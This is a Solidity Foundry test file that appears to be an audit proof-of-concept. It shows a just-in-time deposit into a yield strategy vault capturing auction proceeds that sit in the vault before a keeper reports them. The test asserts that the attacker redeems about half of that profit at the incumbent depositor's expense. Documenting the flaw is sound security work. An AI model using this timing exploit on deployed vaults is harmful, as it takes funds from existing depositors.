// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import {Setup} from "src/test/utils/Setup.sol";

contract CodexAuctionDilutionTest is Setup {
    address internal attacker = address(11);

    function setUp() public override {
        super.setUp();
        setFees(0, 0);
    }

    function test_jitDepositCapturesUnreportedAuctionProceeds() public {
        uint256 incumbentDeposit = 10_000e18;
        uint256 attackerDeposit = 10_000e18;
        uint256 returnedAuctionProceeds = 1_000e18;

        mintAndDepositIntoStrategy(strategy, user, incumbentDeposit);
        skip(strategy.profitMaxUnlockTime());

        vm.prank(keeper);
        (uint256 firstProfit, uint256 firstLoss) = strategy.report();
        assertEq(firstProfit, 0, "!firstProfit");
        assertEq(firstLoss, 0, "!firstLoss");
        assertGt(
            auction.available(strategy.REWARDS_TOKEN()),
            0,
            "!auctionRewards"
        );

        // Equivalent to Auction.take() pulling USDS from a taker to this strategy
        // as receiver.
        airdrop(asset, address(strategy), returnedAuctionProceeds);
        assertEq(
            asset.balanceOf(address(strategy)),
            returnedAuctionProceeds,
            "!idleProceeds"
        );

        airdrop(asset, attacker, attackerDeposit);
        uint256 attackerBefore = asset.balanceOf(attacker);

        depositIntoStrategy(strategy, attacker, attackerDeposit);
        assertEq(strategy.balanceOf(attacker), attackerDeposit, "!shares");

        vm.prank(keeper);
        (uint256 profit, uint256 loss) = strategy.report();
        assertEq(profit, returnedAuctionProceeds, "!profit");
        assertEq(loss, 0, "!loss");

        skip(strategy.profitMaxUnlockTime());

        uint256 attackerShares = strategy.balanceOf(attacker);
        vm.prank(attacker);
        strategy.redeem(attackerShares, attacker, attacker);

        uint256 attackerProfit = asset.balanceOf(attacker) - attackerBefore;
        assertApproxEqAbs(
            attackerProfit,
            returnedAuctionProceeds / 2,
            2,
            "!capturedProfit"
        );
    }
}
